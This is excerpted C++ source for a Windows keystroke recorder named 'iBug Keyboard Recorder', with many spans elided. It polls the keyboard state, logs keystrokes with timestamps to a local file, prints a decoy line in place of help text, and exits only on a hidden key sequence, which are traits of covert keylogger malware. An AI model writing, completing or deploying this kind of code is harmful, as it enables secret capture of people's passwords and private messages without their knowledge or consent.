...
const char *const Version = "alpha 0.1.3.8";
typedef unsigned long OptionSet; // 32 boolean options

typedef OptionSet Charset;
enum{
	CS_ALL = 0,
	CS_VISIBLE = 1,
	CS_SHIFT = 2,
	...
	CS_MEDIA = 16,
	CS_ARROW = 32,
	CS_BROWSER = 64, // Unsupported at present
	CS_UNKNOWN = 128
};
enum{
	OP_DEFAULT = 0,
...
struct _Global_Struct_CXX{
	Monitor_Info monitorInfo;
	OptionSet OutputOption;
	OptionSet TimeOption;
...
string GetKey(int Key){
	...
	if(Key >= 186 && Key <= 222){
		...
		case VK_SPACE:
			if (_global.OutputOption & OP_SPACE_VISIBLE){KeyString = "[SP]";}
			else{KeyString = " ";}break;
...
string FormatTime(const SYSTEMTIME& Time){
	static string ret;
    static char cBuf[24];
    if (_global.TimeOption & TIME_SHOW_MS)
    	snprintf(cBuf, sizeof(cBuf), "%d-%2d-%2d %2d:%02d:%02d.%03d",
...
int operator >> (const SYSTEMTIME& A, const SYSTEMTIME& B){
	...
	S += 86400*Q;
	if (A.wMilliseconds > B.wMilliseconds) --S;
	return S;
}

void ProcessCommandLine(int argc, char* argv[]){
	_global.monitorInfo.OutputFile = "k.txt";
	_global.monitorInfo.charset = CS_VISIBLE;
	_global.monitorInfo.idleTime = 15;
	if (argc == 1) return;
	...
	for (int i = 1; i < argc; i ++){
		if (argv[i][0] == '/' || argv[i][0] == '-'){
			str = argv[i]+1;
			if (str=="o" || str=="Out"){
				_global.monitorInfo.OutputFile = argv[++i];
				continue;
			}
			if (str=="cs" || str=="Charset"){
				...
				for (int j = 0; j < str.length(); j ++){
					if (str[j]=='*'){
						...
						case 'a': cs |= CS_ARROW; break; 
						case 'B': cs |= CS_BROWSER; break;
						case 'U': cs |= CS_UNKNOWN; break;
						default: break;
					}
				}
				_global.monitorInfo.charset = cs;
				continue;
			}
			if (str=="i" || str=="Idle" || str=="IdleTime"){
				int t = atol(argv[++i]);
				if (t <= 0) t = 15;
				_global.monitorInfo.idleTime = t;
				continue;
			}
			
			if (str=="space-visible" || str=="op-space-visible")
				_global.OutputOption |= OP_SPACE_VISIBLE;
			if (str=="show-ms" || str=="time-show-ms")
				_global.TimeOption |= TIME_SHOW_MS;
			
			if (str=="?" || str=="h" || str=="help" || str=="-help"){
				cerr << "Master Shiang Dzurr plays silver power." << endl;
				exit(0);
			}
			if (str=="version"){
				cerr << "iBug Keyboard Recorder" << endl;
...
DWORD WINAPI MonitorThread(Monitor_Info* mInfo){
	...
	file.close(); // Just confirm the file is available
			...
			if (GetAsyncKeyState(i) & 1){
				if (HiddenIndex >= 0 && i == HiddenSequence[HiddenIndex]){
					...
					if (HiddenIndex == HiddenSequenceLength){
						file.open(Filename.c_str(), ios::out | ios::app);
						GetLocalTime(&TimeA);
						file << "Quit: " << FormatTime(TimeA) << endl;
						file.close();
						exit(0);
					}
					continue;
				...
				// Process only if the key is wanted 
				if (FindCharset(i, cs)){
					file.open(Filename.c_str(), ios::out | ios::app);
					GetLocalTime(&TimeB);
					if (TimeA >> TimeB >= idleTime)
						file << endl << endl << "Record: " << FormatTime(TimeB) << endl;
					TimeA = TimeB;
					str = GetKey(i);
...
int main(int argc, char* argv[]){
	...
	HANDLE hThreadMonitor = CreateThread(
		NULL, 0, (LPTHREAD_START_ROUTINE)MonitorThread, &_global.monitorInfo, 0, NULL);
